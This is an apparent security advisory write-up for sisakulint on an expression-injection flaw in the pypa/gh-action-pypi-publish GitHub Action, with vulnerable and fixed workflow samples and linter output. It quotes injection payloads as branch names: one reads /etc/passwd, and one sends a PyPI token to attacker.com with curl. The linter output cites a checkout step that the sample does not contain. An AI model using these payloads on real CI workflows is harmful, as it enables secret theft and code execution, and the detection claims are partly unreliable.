# GHSA-vxmw-7h4f-hqxh

## Summary
| Field | Value |
|-------|-------|
| CVE | N/A |
| Affected Action | pypa/gh-action-pypi-publish |
| Severity | Low |
| CVSS Score | 0.0/10 |
| Vulnerability Type | Expression Injection (CWE-77) |
| Published | 2024-01-24 |

## Vulnerability Description

The pypa/gh-action-pypi-publish action (all versions < 1.13.0) contains an expression injection vulnerability in its `set-repo-and-ref` composite action step. The action uses GitHub Actions expression expansions (`${{ ... }}`) in contexts that may be attacker-controllable.

The vulnerability exists in this code pattern:
```yaml
REF=${{ env.ACTION_REF || env.PR_REF || github.ref_name }}
```

When `env.ACTION_REF` and `env.PR_REF` evaluate to empty strings, the expression falls back to `github.ref_name`, which an attacker can control via branch or tag names. Because the expansion uses `${{ ... }}` rather than shell interpolation `${...}`, it bypasses normal shell quoting rules. An attacker could set a malicious branch name like `innocent;cat${IFS}/etc/passwd` to execute arbitrary code within the workflow step context.

**Impact Assessment:** The impact is very low because `env.ACTION_REF` should normally take precedence, making the vulnerable code path rarely executed. The action is **not vulnerable** in common configurations using `pull_request`, `release`, or `push: tags` events.

**Affected versions:** All versions < 1.13.0
**Patched versions:** 1.13.0 and later

## Vulnerable Pattern

```yaml
on:
  pull_request_target:

jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - name: Set version from ref
        run: |
          REF=${{ env.ACTION_REF || env.PR_REF || github.ref_name }}
          echo "VERSION=${REF}" >> $GITHUB_ENV
```

**Attack Vector**: An attacker creates a PR from a branch named:
```
'; curl https://attacker.com?secret=${{ secrets.PYPI_TOKEN }}; echo '
```

This injects code into the expression that can exfiltrate secrets or execute arbitrary commands.

## Safe Pattern

```yaml
on:
  pull_request_target:

jobs:
  safe:
    runs-on: ubuntu-latest
    steps:
      - name: Set version from ref
        env:
          REF_NAME: ${{ github.ref_name }}
          ACTION_REF: ${{ env.ACTION_REF }}
          PR_REF: ${{ env.PR_REF }}
        run: |
          REF="${ACTION_REF:-${PR_REF:-$REF_NAME}}"
          echo "VERSION=${REF}" >> $GITHUB_ENV
```

**Mitigation**: Pass untrusted contexts through environment variables instead of directly embedding them in expressions. This prevents expression injection by treating the value as a literal string.

## sisakulint Detection Result

```
script/actions/advisory/GHSA-vxmw-7h4f-hqxh-vulnerable.yaml:9:3: dangerous trigger (critical): workflow uses privileged trigger(s) [pull_request_target] without any security mitigations. These triggers grant write access and secrets access to potentially untrusted code. Add at least one mitigation: restrict permissions (permissions: read-all or permissions: {}), use environment protection, add label conditions, or check github.actor. See https://sisaku-security.github.io/lint/docs/rules/dangeroustriggersrulecritical/ [dangerous-triggers-critical]
script/actions/advisory/GHSA-vxmw-7h4f-hqxh-vulnerable.yaml:17:16: checking out untrusted code from pull request in workflow with privileged trigger 'pull_request_target' (line 9). This allows potentially malicious code from external contributors to execute with access to repository secrets. Use 'pull_request' trigger instead, or avoid checking out PR code when using 'pull_request_target'. See https://sisaku-security.github.io/lint/docs/rules/untrustedcheckout/ for more details [untrusted-checkout]
```

### Analysis

| Detected | Rule | Category Match |
|----------|------|----------------|
| Yes | UntrustedCheckoutRule | Yes |
| Yes | DangerousTriggersCriticalRule | Yes |

**Detection Mechanism**: sisakulint detects the untrusted checkout pattern at line 17 and the dangerous use of `pull_request_target` trigger at line 9 without security mitigations. While the specific expression injection vulnerability in `github.ref_name` is not explicitly detected in this output, the related dangerous patterns are caught by multiple rules.

## References
- [GitHub Advisory](https://github.com/advisories/GHSA-vxmw-7h4f-hqxh)
- [PyPA Security Advisory](https://github.com/pypa/gh-action-pypi-publish/security/advisories/GHSA-vxmw-7h4f-hqxh)
- [Patch Commit](https://github.com/pypa/gh-action-pypi-publish/commit/77db1b7cf7dcea2e403bb4350516284282740dd6)
- [Vulnerable Code Permalink](https://github.com/pypa/gh-action-pypi-publish/blob/db8f07d3871a0a180efa06b95d467625c19d5d5f/action.yml#L114-L125)
- [sisakulint: CodeInjectionRule](../codeinjection.md)
